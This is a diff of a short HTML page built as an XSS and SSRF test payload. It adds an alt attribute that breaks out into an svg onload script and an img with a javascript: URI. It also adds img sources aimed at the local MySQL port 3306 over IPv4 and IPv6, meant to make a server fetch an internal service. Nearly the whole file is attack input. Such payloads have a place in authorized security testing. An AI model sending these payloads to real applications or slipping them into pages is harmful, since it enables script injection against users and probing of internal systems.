@@ -1,5 +1,18 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Payload Ganda: SSRF & XSS</title>
+</head>
 <body>
-   <img src="<img src=x onerror="alert(1)">">
+    <h1>Testing SSRF MySQL & XSS</h1>
+
+    <img src="https://www.google.com/favicon.ico" alt="&quot;><svg onload=alert(1)>">
+    <img src="javascript:alert(1)" alt="xss-js-uri">
+
+    <img src="http://[::1]:3306/" alt="mysql-ipv6">
+
+    <img src="http://127.0.0.1:3306/" alt="mysql-ipv4">
+
 </body>
 </html>
